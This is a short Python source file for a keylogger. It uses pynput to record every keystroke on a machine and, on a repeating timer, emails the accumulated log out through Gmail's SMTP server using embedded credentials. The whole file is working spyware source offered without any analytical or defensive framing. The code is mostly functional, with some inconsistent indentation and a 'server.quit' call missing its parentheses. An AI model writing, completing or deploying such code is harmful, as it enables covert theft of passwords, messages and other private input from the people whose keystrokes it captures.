import pynput.keyboard
import threading
import smtplib
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Start"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def capture_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def send_mail(self,email,password,message):
    	server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
    	server.login(email, password)
    	server.sendmail(email, email, message)
    	server.quit
    
    def start(self):
        key_listener = pynput.keyboard.Listener(on_press=self.capture_press)
        with key_listener:
           self.report()
           key_listener.join()
